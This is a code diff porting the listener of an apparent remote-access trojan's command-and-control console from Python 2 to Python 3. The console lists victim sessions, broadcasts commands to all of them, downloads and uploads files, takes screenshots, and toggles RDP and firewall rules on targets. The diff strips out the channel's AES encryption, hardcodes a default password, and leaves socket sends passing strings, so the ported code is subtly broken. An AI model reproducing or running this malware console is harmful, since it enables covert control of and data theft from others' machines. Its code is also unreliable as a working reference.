@@ -1,7 +1,7 @@
-#!/usr/bin/python
+
 # -*- encoding: utf-8 -*-
 
-from lib.AES_cipher import AESCipher
+#from lib.AES_cipher import AESCipher
 from lib.setting import *
 from time import *
 
@@ -43,22 +43,22 @@ class listener:
         while True:
                 try:
                     command_list = ["session","sessions","kill","help","cast","killall","exit"]
-                    command = raw_input("\033[1;32;33m[ CNC ] >>> \x1b[0m")
+                    command = input("\033[1;32;33m[ CNC ] >>> \x1b[0m")
                     command = command.split(" ")
                     if command[0] == "sessions":
                         count = 0
-                        print """\n\n 
+                        print ("""\n\n 
  Sessions
  ========
  
  ID             address                 connection time
  --     --------------------            ---------------
-"""
+""")
                         for ip in self.ips:
-                            print " ", "".join(str(count)) + "\t" + str(ip[0]) + ":" + str(ip[1]) + "\t\t", self.connection_time[count]
+                            print (" ", "".join(str(count)) + "\t" + str(ip[0]) + ":" + str(ip[1]) + "\t\t", self.connection_time[count])
                             count += 1
-                        print "\n\n"
-                        print green, "Connected sessions: ",self.clients,"\n", r
+                        print ("\n\n")
+                        print (green, "Connected sessions: ",self.clients,"\n", r)
 
 
                     elif command[0] == "session":
@@ -66,32 +66,32 @@ class listener:
                             num = int(command[1])
                             tarnum = self.targets[num]
                             tarip = self.ips[num]
-                            print "\n\033[1;32;34m[+]\x1b[0m Connected to Session", command[1], "\033[1;32;34m[+]\x1b[0m\n"
+                            print ("\n\033[1;32;34m[+]\x1b[0m Connected to Session", command[1], "\033[1;32;34m[+]\x1b[0m\n")
                             self.run(tarnum, tarip)
                         except KeyboardInterrupt:
-                            print "\n\033[1;32;34m\n[+]\x1b[0m Session sent to background \033[1;32;34m[+]\x1b[0m\n"
+                            print ("\n\033[1;32;34m\n[+]\x1b[0m Session sent to background \033[1;32;34m[+]\x1b[0m\n")
                             pass
-                        except Exception,e:
+                        except Exception as e:
                             if "Broken pipe" in e:
                                 self.targets.remove(self.targets[num])
                                 self.ips.remove(self.ips[num])
                                 self.id -= 1
                                 self.clients -= 1
-                                print red,"\n[!] Session is not responding, this ID will be removed [!]\n",r
-                                print "\033[1;32;33m\n[+]\x1b[0m Session ID ", str(num), " removed \033[1;32;33m[+]\x1b[0m\n"
+                                print (red,"\n[!] Session is not responding, this ID will be removed [!]\n",r)
+                                print ("\033[1;32;33m\n[+]\x1b[0m Session ID ", str(num), " removed \033[1;32;33m[+]\x1b[0m\n")
                             else:
-                                print e
-                                print "\n\033[1;32;31m [!]\x1b[0m Invalid session ID\033[1;32;31m [!]\n\x1b[0m"
+                                print (e)
+                                print ("\n\033[1;32;31m [!]\x1b[0m Invalid session ID\033[1;32;31m [!]\n\x1b[0m")
 
 
                     elif command[0] == "help":
-                        print c2help
+                        print (c2help)
 
 
                     # run the given command on all connected sessions and return the results........................................................................
                     elif command[0] == "cast":
                         if not command[1]:
-                            print  "\n\033[1;32;31m [!]\x1b[0m usage: cast [command] \033[1;32;31m [!]\n\x1b[0m"
+                            print  ("\n\033[1;32;31m [!]\x1b[0m usage: cast [command] \033[1;32;31m [!]\n\x1b[0m")
                         else:
                             number_of_targets= len(self.targets)
                             i = 0
@@ -101,16 +101,16 @@ class listener:
                                     target_number = self.targets[i]
                                     target_session = self.session_id[i]
 
-                                    print "\033[1;32;32m \n[+]\x1b[0m Response from session ",target_session ," ,",str(target_address[0]),":",str(target_address[1]),"\033[1;32;32m [+]\x1b[0m"
-                                    print  green,"=============================================================================",r
+                                    print ("\033[1;32;32m \n[+]\x1b[0m Response from session ",target_session ," ,",str(target_address[0]),":",str(target_address[1]),"\033[1;32;32m [+]\x1b[0m")
+                                    print  (green,"=============================================================================",r)
                                     try:
                                         self.json_send(command[1:],target_number)
-                                        print self.receive(target_number) + "\n\n"
+                                        print (self.receive(target_number) + "\n\n")
                                     except :
                                         pass
                                     i += 1
-                            except Exception,e:
-                                print e
+                            except Exception as e:
+                                print (e)
 
                     # kills a session and removes the entries from target list.....................................................
                     elif command[0] == "kill":
@@ -124,9 +124,9 @@ class listener:
                             self.ips.remove(self.ips[counter])
                             self.id -= 1
                             self.clients -= 1
-                            print "\033[1;32;33m\n[+]\x1b[0m Session ",str(counter)," terminated \033[1;32;33m[+]\x1b[0m\n"
+                            print ("\033[1;32;33m\n[+]\x1b[0m Session ",str(counter)," terminated \033[1;32;33m[+]\x1b[0m\n")
                         except:
-                            print "\n\033[1;32;31m [!]\x1b[0m Invalid session ID\033[1;32;31m [!]\n\x1b[0m"
+                            print ("\n\033[1;32;31m [!]\x1b[0m Invalid session ID\033[1;32;31m [!]\n\x1b[0m")
                             pass
 
                     elif command[0] == "killall":
@@ -146,9 +146,9 @@ class listener:
                                 except:
                                     pass
                                 i += 1
-                            print "\033[1;32;33m\n[+]\x1b[0m All sessions terminated successfully \033[1;32;33m[+]\x1b[0m\n"
+                            print ("\033[1;32;33m\n[+]\x1b[0m All sessions terminated successfully \033[1;32;33m[+]\x1b[0m\n")
                         except:
-                            print "\n\033[1;32;31m [!]\x1b[0m Error occured while terminating sessions \033[1;32;31m [!]\n\x1b[0m"
+                            print ("\n\033[1;32;31m [!]\x1b[0m Error occured while terminating sessions \033[1;32;31m [!]\n\x1b[0m")
                             pass
 
 
@@ -158,35 +158,35 @@ class listener:
                         command = ' '.join(command[0:])
                         try:
                             if os_type == "linux":
-                                print str(subprocess.check_output(command + "; exit 0", shell=True, stderr=subprocess.STDOUT))
+                                print (str(subprocess.check_output(command + "; exit 0", shell=True, stderr=subprocess.STDOUT)))
                             else:
                                 DEVNULL = open(os.devnull, 'wb')
-                                print str(subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL))
-                        except Exception,e:
-                            print "\n\033[1;32;31m [!]\x1b[0m Error occured while running local command \033[1;32;31m [!]\n\x1b[0m"
-                            print e
+                                print (str(subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)))
+                        except Exception as e:
+                            print ("\n\033[1;32;31m [!]\x1b[0m Error occured while running local command \033[1;32;31m [!]\n\x1b[0m")
+                            print (e)
 
                     elif "exit" in command:
-                        exit_check = raw_input("\n\033[0;31m[>] Exit the CNC ? (y/n): \033[0m")
+                        exit_check = input("\n\033[0;31m[>] Exit the CNC ? (y/n): \033[0m")
                         if exit_check == 'y':
-                            print red, "\n [!] CNC terminated... [!]\n", r
+                            print (red, "\n [!] CNC terminated... [!]\n", r)
                             os._exit(os.EX_OK)
                         elif exit_check == 'n':
                             break
                         else:
-                            print red, "\n[!] wrong input [!]\n", r
+                            print (red, "\n[!] wrong input [!]\n", r)
                             continue
 
                 except KeyboardInterrupt:
                     while True:
-                        exit_check = raw_input("\n\033[0;31m[>] Exit the CNC ? (y/n): \033[0m")
+                        exit_check = input("\n\033[0;31m[>] Exit the CNC ? (y/n): \033[0m")
                         if exit_check == 'y':
-                            print red, "\n [!] CNC terminated... [!]\n", r
+                            print (red, "\n [!] CNC terminated... [!]\n", r)
                             os._exit(os.EX_OK)
                         elif exit_check == 'n':
                             break
                         else:
-                            print red, "\n[!] wrong input [!]\n", r
+                            print(red, "\n[!] wrong input [!]\n", r)
                             continue
 
 
@@ -202,26 +202,26 @@ class listener:
             try:
                 self.conn, addr = self.sock.accept()
                 date_time = strftime("%Y-%m-%d %H:%M:%S",gmtime())
-                print blue, "\n\n[+] New connection from ", str(addr[0]), ":", \
-                    str(addr[1]), "at ", date_time, " [+]", r
+                print (blue, "\n\n[+] New connection from ", str(addr[0]), ":", \
+                    str(addr[1]), "at ", date_time, " [+]", r)
                 self.targets.append(self.conn)
                 self.ips.append(addr)
                 self.session_id.append(self.id)
                 self.connection_time.append(date_time)
-                print green, "\nSession ", self.id, " opened for ", str(addr[0]), ":", str(addr[1]),"\n", r
+                print (green, "\nSession ", self.id, " opened for ", str(addr[0]), ":", str(addr[1]),"\n", r)
                 self.clients += 1
                 self.id += 1
             except:
                 pass
 
     # encrypt/decrypt data ##############################
-    def encrypt(self, message):
-        encrypted = AESCipher(password).encrypt(message)
-        return encrypted
+#    def encrypt(self, message):
+#        encrypted = AESCipher(password).encrypt(message)
+#        return encrypted
 
-    def decrypt(self, message):
-        decrypted = AESCipher(password).decrypt(message)
-        return decrypted
+#    def decrypt(self, message):
+#        decrypted = AESCipher(password).decrypt(message)
+#        return decrypted
 
 
     # write/write file #########################################################################
@@ -230,7 +230,7 @@ class listener:
             with open(path, "wb") as file:
                 file.write(base64.b64decode(content))
                 return "\033[1;32;32m[+]\x1b[0m download completed \033[1;32;32m[+]\x1b[0m"
-        except Exception,e:
+        except Exception as e:
             return "\033[1;32;31m[-]\x1b[0m download failed \033[1;32;31m[-]\x1b[0m"
 
     def read_file(self, path):
@@ -244,9 +244,9 @@ class listener:
     def json_send(self, data, target):
         try:
             json_data = json.dumps(data)
-            return target.send(self.encrypt(json_data))
+            return target.send(json_data)
         except:
-            return target.send(self.encrypt("\033[1;32;31m[-]\x1b[0m STDOUT parsing problem \033[1;32;31m[-]\x1b[0m"))
+            return target.send("\033[1;32;31m[-]\x1b[0m STDOUT parsing problem \033[1;32;31m[-]\x1b[0m")
             pass
 
     def receive(self, target):
@@ -254,7 +254,7 @@ class listener:
         while True:
             try:
                 json_data = json_data + target.recv(1000000)
-                return json.loads(self.decrypt(json_data))
+                return json.loads(json_data)
             except ValueError:
                 continue
             except:
@@ -269,12 +269,12 @@ class listener:
         shot_count = 1
         while True:
 
-            cmd = raw_input("\033[1;32;33m" + str(ip[0]) + ':' + str(ip[1]) + " >>>\x1b[0m ")
+            cmd = input("\033[1;32;33m" + str(ip[0]) + ':' + str(ip[1]) + " >>>\x1b[0m ")
             cmd = cmd.split(" ")
 
             if cmd[0] == "exit":
                 while True:
-                    choice = raw_input("\n \033[1;32;31m[!]\x1b[0m Exit the listener (y/n) ? \x1b[0m")
+                    choice = input("\n \033[1;32;31m[!]\x1b[0m Exit the listener (y/n) ? \x1b[0m")
                     if choice == "y":
                         self.sock.close()
                         sys.exit(0)
@@ -286,9 +286,9 @@ class listener:
 
             elif cmd[0] == "bg":
                 while True:
-                    choice = raw_input("\n \033[1;32;31m[!]\x1b[0m Send the session to background (y/n) ? ")
+                    choice = input("\n \033[1;32;31m[!]\x1b[0m Send the session to background (y/n) ? ")
                     if choice == "y":
-                        print "\n\033[1;32;34m[+]\x1b[0m Session ", str(ip[0]),":",str(ip[1]), " sent to background  \033[1;32;34m[+]\x1b[0m\n"
+                        print ("\n\033[1;32;34m[+]\x1b[0m Session ", str(ip[0]),":",str(ip[1]), " sent to background  \033[1;32;34m[+]\x1b[0m\n")
                         self.C2()
                     elif choice == "n":
                         cmd[0] = None
@@ -299,7 +299,7 @@ class listener:
 
             if cmd[0] == "terminate":
                 while True:
-                    choice = raw_input("\n \033[1;32;31m[!]\x1b[0m Terminate this session (y/n) ? \x1b[0m")
+                    choice = input("\n \033[1;32;31m[!]\x1b[0m Terminate this session (y/n) ? \x1b[0m")
                     if choice == "y":
                         self.id -= 1
                         self.clients -= 1
@@ -307,7 +307,7 @@ class listener:
                         self.conn.close()
                         self.targets.remove(target)
                         self.ips.remove(ip)
-                        print "\033[1;32;33m\n[+]\x1b[0m Session ",str(ip[0]),":",str(ip[1])," terminated \033[1;32;33m[+]\x1b[0m\n"
+                        print ("\033[1;32;33m\n[+]\x1b[0m Session ",str(ip[0]),":",str(ip[1])," terminated \033[1;32;33m[+]\x1b[0m\n")
                         self.C2()
                     elif choice == "n":
                         cmd[0] = None
@@ -316,35 +316,35 @@ class listener:
                         continue
 
             elif cmd[0] == "help":
-                print help
+                print (help)
                 cmd[0] = ' '
 
             elif cmd[0] == "rdp" and len(cmd) != 2:
-                print red, "\n[!] usage: rdp on/off [!]", r
+                print (red, "\n[!] usage: rdp on/off [!]", r)
                 cmd = " "
 
             elif cmd[0] == "display" and len(cmd) !=2:
-                print red, "\n[!] usage: display on/off [!]", r
+                print (red, "\n[!] usage: display on/off [!]", r)
                 cmd = " "
 
             elif cmd[0] == "spawn" and len(cmd) != 3 or cmd[0] == "spawn" and cmd[1] == "-h":
-                print red, "\n[!] usage: spawn [target ip] [target port] [!]", r
+                print (red, "\n[!] usage: spawn [target ip] [target port] [!]", r)
                 cmd = " "
 
             elif cmd[0] == "powershell" and cmd[1] == "-h" or cmd[0] == "powershell" and not cmd[1]:
-                print red, "\n[!] usage: powershell [command] OR [script] [!]", r
+                print (red, "\n[!] usage: powershell [command] OR [script] [!]", r)
                 cmd = " "
 
             elif cmd[0] == "download" and not cmd[1:] or cmd[0] == "upload" and not cmd[1:]:
-                print red, "\n [!] usage: download/upload [file name] [!]", r
+                print (red, "\n [!] usage: download/upload [file name] [!]", r)
                 cmd = " "
             elif cmd[0] == "upload" and cmd[1]:
-                print blue, "[*]\x1b[0m uploading ", ''.join(str(cmd[1])), "\033[1;32;34m[*]\x1b[0m", r
+                print (blue, "[*]\x1b[0m uploading ", ''.join(str(cmd[1])), "\033[1;32;34m[*]\x1b[0m", r)
                 file_content = self.read_file(cmd[1])
                 cmd.append(file_content)
 
             elif cmd[0] == "fw" and len(cmd) != 4 or cmd[0] == "fw" and cmd[1] == "-h":
-                print red, "[!] usage: fw [in/out] [port number] [rule name] [!]", r
+                print (red, "[!] usage: fw [in/out] [port number] [rule name] [!]", r)
                 cmd = " "
 
 
@@ -354,14 +354,14 @@ class listener:
                 pass
 
             elif cmd[0] == "download" and cmd[1]:
-                print blue, "[*]\x1b[0m Downloading ", ''.join(str(cmd[1])), "\033[1;32;34m[*]\x1b[0m", r
+                print (blue, "[*]\x1b[0m Downloading ", ''.join(str(cmd[1])), "\033[1;32;34m[*]\x1b[0m", r)
                 result = self.write_file(cmd[1], result)
                 print(result)
 
             elif cmd[0] == "shot":
                 name = "screenshot%s.png" % str(shot_count)
                 result = self.write_file(name, result)
-                print green, "[+]\x1b[0m screenshot captured \033[1;32;32m[+]\x1b[0m", r
+                print (green, "[+]\x1b[0m screenshot captured \033[1;32;32m[+]\x1b[0m", r)
                 shot_count += 1
             else:
                 print(result)
@@ -510,21 +510,21 @@ if __name__ == '__main__':
             subprocess.call("cls",shell=True)
         else:
             subprocess.call("clear",shell=True)
-        print banner
-        ip = raw_input("\033[1;32;34m[>]\x1b[0m LHOST (default: 0.0.0.0) >>> ")
+        print (banner)
+        ip = input("\033[1;32;34m[>]\x1b[0m LHOST (default: 0.0.0.0) >>> ")
         if ip == "":
             ip = '0.0.0.0'
-        port = raw_input("\033[1;32;34m[>]\x1b[0m LPORT (default: 6000) >>> ")
+        port = input("\033[1;32;34m[>]\x1b[0m LPORT (default: 6000) >>> ")
         if port == "":
             port = 6000
         port = int(port)
-        password = raw_input("\033[1;32;34m[>]\x1b[0m Communication password (default:'djknBDS89dHFS(*HFSD())') >>>")
+        password = input("\033[1;32;34m[>]\x1b[0m Communication password (default:'djknBDS89dHFS(*HFSD())') >>>")
         if password == "":
             password = 'djknBDS89dHFS(*HFSD())'
-        print cyan, "\n Handler started on ", ip, ":", port, "...\n\n", r
+        print (cyan, "\n Handler started on ", ip, ":", port, "...\n\n", r)
         starter = listener(ip, port)
         starter.run()
-    except Exception,e:
-        print e
+    except Exception as e:
+        print (e)
         pass
 
